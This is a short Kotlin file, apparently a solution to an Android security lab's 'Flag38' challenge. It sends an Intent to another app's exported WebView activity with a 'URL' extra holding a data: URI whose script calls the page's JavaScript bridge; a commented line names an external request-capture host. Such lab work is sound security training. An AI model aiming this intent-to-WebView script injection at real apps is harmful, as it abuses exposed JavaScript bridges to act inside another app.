package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent

object Flag38 {
    fun getFlag(context: Context) {
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.webviews.Flag38WebViewsActivity"
            )
//            putExtra("URL", "https://hextree.free.beeceptor.com/flag38")
            putExtra("URL", "data:text/html,<script>window.hextree.success(true);</script>")
        }
        context.startActivity(intent)
    }
}
